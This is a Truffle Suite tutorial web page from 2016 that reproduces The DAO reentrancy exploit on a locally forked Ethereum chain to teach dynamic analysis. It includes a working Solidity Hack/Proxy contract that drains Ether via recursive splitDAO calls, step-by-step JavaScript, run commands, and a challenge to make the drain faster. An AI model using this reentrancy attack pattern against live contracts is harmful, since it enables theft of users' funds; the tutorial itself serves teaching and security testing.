<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <!-- Favicon -->
    <link rel="icon" href="/img/favicons/favicon.ico">

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="application-name" content="Truffle Suite">
    <link rel="icon" sizes="192x192" href="/img/favicons/chrome-touch-icon-192x192.png">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Truffle Suite">
    <link rel="apple-touch-icon" href="/img/favicons/apple-touch-icon.png">

    <!-- Tile icon for Win8/10 (144x144 + tile color) -->
    <meta name="msapplication-TileImage" content="img/favicons/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <!-- Facebook OpenGraph -->
    <meta property="og:site_name" content="Truffle Suite" />
    <meta property="og:description" content="The Truffle suite of tools make dapp development easier and more consistent." />
    <meta property="og:title" content="Truffle Suite | Tutorials | Chain Forking and Dynamic Analysis: Exploiting The DAO" />
    <meta property="og:url" content="https://trufflesuite.com/tutorials/chain-forking-exploiting-the-d" />
    <meta property="og:type" content="article" />
    <meta property="og:image" content="https://truffleframework.com/img/favicons/truffle-share.png" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="Truffle Suite" />
    <meta name="twitter:title" content="Truffle Suite | Tutorials | Chain Forking and Dynamic Analysis: Exploiting The DAO" />
    <meta name="twitter:description" content="The Truffle suite of tools make dapp development easier and more consistent." />
    <meta name="twitter:creator" content="Truffle Suite" />
    <meta name="twitter:domain" content="trufflesuite.com" />
    <meta name="twitter:image:src" content="https://truffleframework.com/img/favicons/truffle-share.png" />
    
    <meta name="google-site-verification" content="BSgPkMHzw7IxJTpEElNfD8ZZYPzXgOQiTVPzAxAG8-o" />
      
    <title>Truffle Suite | Tutorials | Chain Forking and Dynamic Analysis: Exploiting The DAO</title>

    <link href="https://fonts.googleapis.com/css?family=Grand+Hotel|Open+Sans|Oswald|Varela+Round|Roboto+Condensed|Roboto+Mono" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.9/css/all.css" integrity="sha384-5SOiIsAziJl6AWe0HWRKTXlfcSHKmYV4RBF18PPJ173Kzn7jzMyFuTtk8JA7QQG1" crossorigin="anonymous">
    <link rel="stylesheet" href="/css/index.css">
  </head>
  <body>
    <nav class="navbar navbar-expand-md navbar-dark fixed-top" id="primaryNav">
      <a class="navbar-brand current" href="/">
        <img class="suite-logo" src="/img/truffle-logomark.svg" alt="Truffle Logo" />TRUFFLE SUITE
      </a>
    
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    
      <div class="collapse navbar-collapse" id="navbarsExampleDefault">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" id="suiteDropdown" href="#" data-toggle="dropdown">SUITE</a>
    
            <div class="dropdown-menu">
              <a class="text-truffle" href="/truffle">
                <img class="suite-logo" src="/img/truffle-logomark.svg" alt="Truffle Logo" /><span class="narrow">T</span>RUFFLE
              </a>
              <a class="text-ganache" href="/ganache">
                <img class="suite-logo" src="/img/ganache-logomark.svg" alt="Ganache Logo" />Ganache
              </a>
              <a class="text-drizzle" href="/drizzle">
                <img class="suite-logo" src="/img/drizzle-logomark.svg" alt="Drizzle Logo" />dri<span class="drizzle-z-skew-1">z</span><span class="drizzle-z-skew-2">z</span>le
              </a>
            </div>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/docs">DOCS</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/tutorials">TUTORIALS</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/boxes">BOXES</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/blog">BLOG</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/community">COMMUNITY</a>
          </li>
        </ul>
      </div>
    </nav>
    <main class="container container-heading container-narrow">
      <div class="row">
        <div class="col">
          <h1>Chain Forking and Dynamic Analysis: Exploiting The DAO</h1>
          <ul class="list-sm-stacker space-icon mb-0">
            <li><i class="far fa-calendar-alt"></i> 2016-09-26&nbsp;&nbsp;&nbsp;</li>
            <li><i class="far fa-user"></i> Tim Coulter</li>
          </ul>
        </div>
      </div>
    </main>

    <main class="banner banner-light-cream pt-5 pb-5" role="main">
      <div class="container container-post">
        <div class="row justify-content-center">
          <div class="col">
            <p class="alert alert-info">
<strong>Update</strong>: Since this tutorial was published, we have released <a href="/ganache">Ganache</a>, a personal blockchain and a replacement to the TestRPC. We have left this tutorial unaltered, but we highly recommend checking out our <a href="/docs/ganache/using">Working with Ganache</a> page.
</p>

<p>Since The DAO <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">was exploited</a>, the Ethereum community has swarmed into action. From hardening our most popular language with the <a href="https://github.com/ethereum/solidity/releases/tag/v0.4.0">latest Solidity release</a> to visualizing possible security vulnerabilities with <a href="https://github.com/raineorshine/solgraph">SolGraph</a>, the community has made security its number one focus. There are many ways in which to discover security threats, and most were discussed during Devcon 2 in Shanghai. The <a href="https://github.com/ethereumjs/testrpc">ethereumjs-testrpc</a> authors have focused on one specifically, which we&#39;ll discuss here, called dynamic analysis through chain forking.</p>

    <h2 class="link-markdown">
      <a href="#what-is-dynamic-analysis-" name="what-is-dynamic-analysis-"><i class="fas fa-link"></i></a>
      What is Dynamic Analysis?
    </h2>
  <p>Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It&#39;s a similar process to <a href="http://www.satisfice.com/articles/what_is_et.shtml">exploratory testing</a>, with the same goals, but perhaps more technical.</p>
<p>Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it&#39;s a tedious process to move the live data over to a separate chain, and you&#39;d have to perform this process multiple times if you end up mucking with the chain state during testing.</p>

    <h2 class="link-markdown">
      <a href="#hello-testrpc" name="hello-testrpc"><i class="fas fa-link"></i></a>
      Hello, TestRPC
    </h2>
  <p>In early September, <a href="https://github.com/ethereumjs/testrpc">ethereumjs-testrpc</a> released its <code>--fork</code> feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to &quot;fork&quot; from the live chain -- i.e., create a new blockchain that starts from the last block on the existing chain -- allowing you to make transactions on the new chain without spending real Ether or changing the existing chain&#39;s state. What&#39;s more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we&#39;ll talk about how we can use it for dynamic analysis.</p>

    <h2 class="link-markdown">
      <a href="#exploiting-the-dao" name="exploiting-the-dao"><i class="fas fa-link"></i></a>
      Exploiting The DAO
    </h2>
  <p>One great feature of the TestRPC is that it&#39;s scriptable. Although this tutorial will show you how we exploited it, with the TestRPC&#39;s new <code>--fork</code> feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a <a href="https://github.com/tcoulter/dao-truffle">Truffle project here</a>, and the original demo video below.</p>
<iframe class="embed-responsive" width="711" height="400" src="https://www.youtube.com/embed/MLtsmnhiXCE" frameborder="0" allowfullscreen></iframe>


    <h3 class="link-markdown">
      <a href="#overview-of-the-exploit" name="overview-of-the-exploit"><i class="fas fa-link"></i></a>
      Overview of the exploit
    </h3>
  <p>The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here&#39;s a general overview of the steps we&#39;ll perform:</p>
<ol>
<li>Fork from the live chain at a block <em>just before</em> the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example&#39;s sake).</li>
<li>Participate in the presale by buying DAO tokens.</li>
<li>Wait one day for the presale to end.</li>
<li>Deploy our Hack contract to the network that we will eventually use to exploit the DAO.</li>
<li>Transfer the DAO tokens we purchased to the hack contract.</li>
<li>Have our DAO contract make a split proposal, which is required to perform the exploit.</li>
<li>Vote yes on our own proposal (someone has to).</li>
<li>Wait a week for our proposal voting time to end (we end up waiting eight days for good measure).</li>
<li>Perform our split, which starts the hack.</li>
<li>Then continue it in a loop!</li>
</ol>

    <h3 class="link-markdown">
      <a href="#aside-traveling-through-time" name="aside-traveling-through-time"><i class="fas fa-link"></i></a>
      Aside: Traveling through time
    </h3>
  <p>In the above overview, there are a few steps that require us to wait <strong>days</strong> to complete. Don&#39;t worry: the TestRPC has features that allow us to jump forward in time, so waiting days for a single step will take mere milliseconds. Bon voyage!</p>

    <h3 class="link-markdown">
      <a href="#step-1-forking-from-the-main-chain" name="step-1-forking-from-the-main-chain"><i class="fas fa-link"></i></a>
      Step 1: Forking from the main chain
    </h3>
  <p>This step requires you to sync the live chain using <a href="https://github.com/ethereum/go-ethereum">go-ethereum</a> or <a href="http://ethdocs.org/en/latest/ethereum-clients/">any other Ethereum client</a>. Because we&#39;ll be forking from a previous state, you <strong>must sync the whole chain</strong>; you can&#39;t use the <code>--fast</code> option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we&#39;ll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it&#39;s intended to be installed.</p>
<p>Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we&#39;ll assume you have your client accepting requests on <code>http://127.0.0.1:8545</code>, the default for most clients.</p>
<p>To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We&#39;re creating a programmable script that exploits The DAO, so you&#39;ll first need to install the required dependencies and include them within the script. We won&#39;t be writing the whole script here, but you can follow along via <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">the script on github</a>.</p>
<pre><code class="lang-javascript">var web3 = new Web3(TestRPC.provider({
  fork: &quot;http://127.0.0.1:8545@1599200&quot;
}));
</code></pre>
<p>Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from <code>http://127.0.0.1:8545</code> (our live chain). As well, we tell it that we want to fork from <a href="https://etherscan.io/block/1599200">block 1599200</a>; this is a block that was mined right before the DAO presale ended.</p>

    <h3 class="link-markdown">
      <a href="#step-2-participate-in-the-presale" name="step-2-participate-in-the-presale"><i class="fas fa-link"></i></a>
      Step 2: Participate in the presale
    </h3>
  <p>Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens:</p>
<pre><code class="lang-javascript">var DAO = DAOContract.at(&quot;0xbb9bc244d798123fde783fcc1c72d3bb8c189413&quot;);

web3.eth.sendTransaction({
  from: accounts[0],
  to: DAO.address,
  value: web3.toWei(90, &quot;Ether&quot;),
  gas: 90000
}, callback);
</code></pre>
<p>Note that the <code>accounts</code> array is populated by our script, which used <code>web3.eth.getAccounts()</code> to get a list of all available accounts provided to us by the TestRPC. As well, we&#39;ve pointed an instance of the DAO contract to the address <a href="https://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413">0xbb9bc244d798123fde783fcc1c72d3bb8c189413</a>, which is the original DAO account and code.</p>
<p>Again, for example&#39;s sake we&#39;re using some shorthand, so please follow along <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">with the script on github</a>.</p>

    <h3 class="link-markdown">
      <a href="#step-3-wait-for-the-presale-to-end" name="step-3-wait-for-the-presale-to-end"><i class="fas fa-link"></i></a>
      Step 3: Wait for the presale to end
    </h3>
  <p>Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, <code>evm_increaseTime</code>:</p>
<pre><code class="lang-javascript">web3.currentProvider.sendAsync({
  jsonrpc: &quot;2.0&quot;,
  method: &quot;evm_increaseTime&quot;,
  params: [86400],  // 86400 seconds in a day
  id: new Date().getTime()
}, callback);
</code></pre>
<p>This will tell the TestRPC to alter its timestamp by <code>86400</code> seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached.</p>

    <h3 class="link-markdown">
      <a href="#step-4-deploy-our-hack-contract-to-the-network" name="step-4-deploy-our-hack-contract-to-the-network"><i class="fas fa-link"></i></a>
      Step 4: Deploy our hack contract to the network
    </h3>
  <p>This hack contract was written by me, but it was heavily influenced by <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">this writeup</a> written by Phil Daian from <a href="http://hackingdistributed.com/">Hacking, Distributed</a>. Many thanks go to him for such a clear writeup.</p>
<p>From Github: <a href="https://github.com/tcoulter/dao-truffle/blob/master/contracts/Hack.sol">./contracts/Hack.sol</a></p>
<pre><code class="lang-javascript">import &quot;DAOInterface.sol&quot;;

contract Proxy {
  DAOInterface DAO;
  address owner;

  function Proxy(address _dao) {
    owner = msg.sender;
    DAO = DAOInterface(_dao);
  }

  function empty() {
    if (msg.sender != owner) return;

    uint balance = DAO.balanceOf(this);
    DAO.transfer(owner, balance);
  }
}

contract Hack {
  uint public proposalID;
  DAOInterface public DAO;
  uint public calls_to_make;
  uint public calls;
  Proxy public proxy;

  function Hack(address _dao) {
    DAO = DAOInterface(_dao);
    calls = 0;
    proxy = new Proxy(_dao);
    calls_to_make = 1;
  }

  function makeSplitProposal() {
    // 0x93a80 == 604800 == 1 week in seconds
    bytes memory transactionData;
    proposalID = DAO.newProposal(this, 0x0, &quot;Lonely, so Lonely&quot;, transactionData, 0x93a80, true);
  }

  function voteYesOnProposal() {
    DAO.vote(proposalID, true);
  }

  function fillProxy() {
    uint balance = DAO.balanceOf(this);
    DAO.transfer(address(proxy), balance);
  }

  function splitDAO() {
    calls += 1;
    DAO.splitDAO(proposalID, this);
  }

  function runHack(uint _calls_to_make) {
    calls = 0;
    calls_to_make = _calls_to_make;
    proxy.empty();
    splitDAO();
  }

  function() {
    if (calls &lt; calls_to_make) {
      splitDAO();
    } else {
      fillProxy();
    }
  }
}
</code></pre>
<ul>
<li>First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they&#39;re stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely.</li>
<li><code>makeSplitProposal()</code>, <code>voteYesOnProposal()</code>, and <code>splitDAO()</code> (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later.</li>
<li><code>fillProxy()</code> takes the Hack contract&#39;s DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, <code>proxy.empty()</code> returns the tokens back to the Hack contract.</li>
<li><code>runHack()</code> gets the hack started, and the fallback function <code>function() {...}</code> runs the hack until we&#39;ve reached the maximum amount of calls we can make within our given gas limit.</li>
</ul>

    <h3 class="link-markdown">
      <a href="#step-5-transfer-dao-tokens-to-hack-contract" name="step-5-transfer-dao-tokens-to-hack-contract"><i class="fas fa-link"></i></a>
      Step 5: Transfer DAO tokens to Hack contract
    </h3>
  <p>Now that our Hack contract is deployed, we need to transfer the DAO balance from <code>accounts[0]</code> to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle:</p>
<pre><code class="lang-javascript">DAO.transfer(Hack.address, balances.accountDAO, {from: accounts[0]}).then(function() {
  callback();
}).catch(callback);
</code></pre>

    <h3 class="link-markdown">
      <a href="#step-6-make-a-split-proposal" name="step-6-make-a-split-proposal"><i class="fas fa-link"></i></a>
      Step 6: Make a split proposal
    </h3>
  <p>Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you&#39;ll be able to move your Ether into your own DAO.</p>
<p>I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO&#39;s <code>newProposal()</code> function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including <a href="https://github.com/slockit/DAO/wiki/How-to-split-the-DAO">this wiki page</a>, <a href="https://github.com/slockit/DAO/wiki/How-to-create-a-proposal">this wiki page</a>, <a href="https://daowiki.atlassian.net/wiki/display/DAO/How+to+split+the+DAO%3A+Step-by-Step">this wiki page</a> as well as the <a href="https://github.com/tcoulter/dao-truffle/tree/master/contracts">DAO code itself</a> (to future developers, I&#39;d highly recommend encapsulating the complexity if you have two &quot;things&quot; of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function:</p>
<pre><code class="lang-javascript">function makeSplitProposal() {
  // 0x93a80 == 604800 == 1 week in seconds
  bytes memory transactionData;
  proposalID = DAO.newProposal(this, 0x0, &quot;Lonely, so Lonely&quot;, transactionData, 0x93a80, true);
}
</code></pre>
<p>Couple points here:</p>
<ul>
<li>The first input is the recipient of the proposal -- or in our case, the curator of the new DAO that&#39;s created -- which is the Hack contract itself.</li>
<li><code>0x0</code> is the amount of Ether to send with the proposal. We&#39;re told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically.</li>
<li><code>&quot;Lonely, so Lonely&quot;</code> is a short description of the proposal. This is the same description the original attacker used, so it&#39;s only fitting to use it ourselves as well.</li>
<li><code>transactionData</code> is any extra input used to call functions on the proposal&#39;s contract were this a real proposal. Since this is a split we&#39;re supposed to leave it blank, but the only way to do so is to create a new <code>bytes</code> type in memory and pass that empty type along.</li>
<li><code>0x93a80</code> is one week in seconds, converted to hexadecimal.</li>
<li><code>true</code> means we&#39;re actually splitting, and not creating a normal proposal.</li>
</ul>
<p>When I executed the above function from Javascript I also watched for the <code>ProposalAdded</code> event fired off by the DAO, which told me the id of the proposal created. You can see how I did that <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">in the script</a>.</p>

    <h3 class="link-markdown">
      <a href="#step-7-vote-yes-on-the-proposal" name="step-7-vote-yes-on-the-proposal"><i class="fas fa-link"></i></a>
      Step 7: Vote yes on the proposal
    </h3>
  <p>This is a simple function call. Like the <code>makeSplitProposal()</code> function above, the <code>voteYesOnProposal()</code> function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it&#39;s encapsulated in the Hack contract, it&#39;s as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted:</p>
<pre><code class="lang-javascript">function voteYesOnProposal() {
  DAO.vote(proposalID, true);
}
</code></pre>

    <h3 class="link-markdown">
      <a href="#step-8-wait-a-week" name="step-8-wait-a-week"><i class="fas fa-link"></i></a>
      Step 8: Wait a week
    </h3>
  <p>The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I&#39;ll leave that as an exercise for the reader, or you can just <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">review the script</a>.</p>

    <h3 class="link-markdown">
      <a href="#step-9-perform-our-first-split" name="step-9-perform-our-first-split"><i class="fas fa-link"></i></a>
      Step 9: Perform our first split
    </h3>
  <p>The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO&#39;s address that we can later use to show our total bounty. We&#39;ve set up the hack contract to only make one split the first time we call <code>splitDAO()</code> (see <code>calls</code> and <code>calls_to_make</code>; <code>calls_to_make</code> defaulted to <code>1</code> when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we&#39;d trigger the hack by continuing to make splits from the fallback function.</p>
<pre><code class="lang-javascript">function splitDAO() {
  calls += 1;
  DAO.splitDAO(proposalID, this);
}
</code></pre>
<p>Like when we created a proposal we also wait for an event here, this time the <code>Transfer</code> event, but again you can see how we did that <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">within the script</a>.</p>

    <h3 class="link-markdown">
      <a href="#step-10-run-the-hack" name="step-10-run-the-hack"><i class="fas fa-link"></i></a>
      Step 10: Run the hack
    </h3>
  <p>This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts.</p>
<pre><code class="lang-javascript">function runHack(uint _calls_to_make) {
  calls = 0;
  calls_to_make = _calls_to_make;
  proxy.empty();
  splitDAO();
}

function() {
  if (calls &lt; calls_to_make) {
    splitDAO();
  } else {
    fillProxy();
  }
}
</code></pre>
<p>The execution logic looks like this:</p>
<ol>
<li>Call <code>runHack()</code> to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don&#39;t go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the <code>splitDAO()</code> function is called, eventually calling <code>DAO.splitDAO()</code>, which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it&#39;s the action of sending the reward -- <code>_recipient.call.value(_amount)()</code> in <code>ManagedAccount.sol</code> -- that enables us to perform the rest of the hack.</li>
<li>Sending the reward to the Hack contract triggers the Hack contract&#39;s fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn&#39;t made too many, it then calls another split via the <code>splitDAO()</code> function. If it <em>has</em> called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract&#39;s balance as zero.</li>
<li>The execution will loop in this way -- split, fallback function, split, fallback function -- until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether.</li>
</ol>
<p>You can see via <a href="https://github.com/tcoulter/dao-truffle/blob/master/index.js">the script</a> where the balance goes. After each set of iterations -- in our case, 26 iterations per set -- you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at <em>Hacking, Distributed</em> for this <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">revelation</a>.</p>

    <h2 class="link-markdown">
      <a href="#running-the-script" name="running-the-script"><i class="fas fa-link"></i></a>
      Running the script
    </h2>
  <p>As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies:</p>
<pre><code class="lang-shell">$ git clone https://github.com/tcoulter/dao-truffle
$ cd dao-truffle
$ npm install
</code></pre>
<p>Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First <a href="http://truffleframework.com">install Truffle</a> then run:</p>
<pre><code class="lang-shell">$ truffle compile
</code></pre>
<p>From here, you can run the script by simply running:</p>
<pre><code class="lang-shell">$ node index.js
</code></pre>
<p>And now you&#39;ve exploited the DAO. Cheers!</p>

    <h2 class="link-markdown">
      <a href="#but-dynamic-analysis-" name="but-dynamic-analysis-"><i class="fas fa-link"></i></a>
      But, Dynamic Analysis?
    </h2>
  <p>Of course you might be asking, &quot;How does this apply to dynamic analysis? You&#39;ve only shown me how to exploit the DAO!&quot; Yes, that&#39;s true, but dynamic analysis was the trojan horse. Because <strong>this hack can be made better</strong>, to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I&#39;ve provided you. You&#39;ve been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out?</p>
<p>As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so...</p>
<pre><code class="lang-shell">$ testrpc --fork http://127.0.0.1:8545@1599200
</code></pre>
<p>... and then use Truffle&#39;s console to interact with the DAO directly:</p>
<pre><code class="lang-shell">$ truffle console
</code></pre>
<p>Good luck, and may all your code be secure!</p>


            <div class="contribute-link">
              See a way to make this page better? <a href="https://github.com/trufflesuite/trufflesuite.com/edit/master/src/tutorials">Edit here &raquo;</a>
            </div>          </div>
        </div>
      </div>
    </main>

    <footer>
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-2 mb-4 mb-md-0">
            <img class="truffle-logo" src="/img/truffle-logo-light.svg" alt="Truffle Logo" />
          </div>
    
          <div class="col-12 col-md-5 mb-3 mb-md-0">
            <ul>
              <!--<li><a href="/careers">CAREERS</a></li>-->
              <li><a href="mailto:inquiry@trufflesuite.com">CONTACT US</a></li>
              <li><a href="/policy">PRIVACY POLICY</a></li>
              <li><a href="/dashboard">DASHBOARD</a></li>
              <li><a href="https://github.com/trufflesuite">GITHUB</a></li>
              <li><a href="https://twitter.com/trufflesuite">TWITTER</a></li>
              <li><a class="trufflecon-link" href="/trufflecon2018">TRUFFLEC<img src="/img/truffle-logomark.svg" alt="Truffle Logo" /><span>O</span>N 2018</a></li>
              <li class="text-truffle">
                <a href="https://new.consensys.net/">
                  <img class="consensys-logomark" src="/img/consensys-logomark.svg" alt="ConsenSys Logo" />
                  &copy; CONSENSYS 2018
                </a>
              </li>
            </ul>
          </div>
    
          <div class="col-12 col-md-5">
            <h4>SIGN UP FOR THE TRUFFLE MAILING LIST</h4>
            <form>
              <div class="form-group">
                <input type="email" class="form-control" id="footerMailingEmail" placeholder="Email Address">
              </div>
              <div class="form-group">
                <input type="text" class="form-control" id="footerMailingFirstName" placeholder="First Name">
                <small id="firstNameHelp" class="form-text text-muted">So we know how to address you.</small>
              </div>
              <button type="submit" class="btn btn-truffle">SUBSCRIBE</button>
            </form>
          </div>
        </div>
      </div>
    </footer>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="/js/vendor/jquery-3.2.1.slim.min.js"><\/script>')</script>
    <script src="/js/bootstrap.min.js"></script>
    <script src="/js/vendor/prism.js"></script>
    <script src="/js/markdown-cleanup.js"></script>

    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-83874933-3', 'auto');
      ga('send', 'pageview');
    </script>  </body>
</html>